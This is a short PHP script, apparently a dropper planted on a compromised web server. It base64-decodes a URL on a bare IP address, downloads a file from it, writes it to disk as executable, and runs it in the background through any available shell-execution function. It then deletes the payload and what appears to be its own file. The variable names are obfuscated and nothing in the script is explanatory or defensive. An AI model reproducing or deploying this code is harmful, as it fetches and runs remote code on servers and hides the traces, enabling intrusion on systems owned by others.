<?php
$statorrule = 'iherb';
$poaltaf = dirname(__FILE__);
$fitle = file_get_contents(base64_decode('aHR0cDovLzgzLjIxNy4xMS4zNy9tYXN0YW4'));
file_put_contents($poaltaf.'/'.$statorrule, "");
function pattr($walto) {
	$listerx = '';
	if (function_exists('exec')) {
		@exec($walto . " > /dev/null &",$listerx);
		$listerx = @join("\n",$listerx);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($walto . " > /dev/null &");
		$listerx = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($walto . " > /dev/null &");
		$listerx = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$listerx = shell_exec($walto . " > /dev/null &");
	} elseif (is_resource($fro = @popen($walto,"r"))) {
		$listerx = "";
		while(!@feof($fro))
			$listerx .= fread($fro,1024);
		pclose($fro);
	}
	return $listerx;
}
chmod($poaltaf.'/', 0755);
$forc = @fopen($poaltaf.'/'.$statorrule, 'a');
@fwrite($forc, $fitle);
@fclose($forc);
@chmod($poaltaf.'/'.$statorrule, 0755);
$dat = pattr($poaltaf.'/'.$statorrule);
unlink($poaltaf.'/'.$statorrule);
unlink($poaltaf.'/MOdoE.php');
?>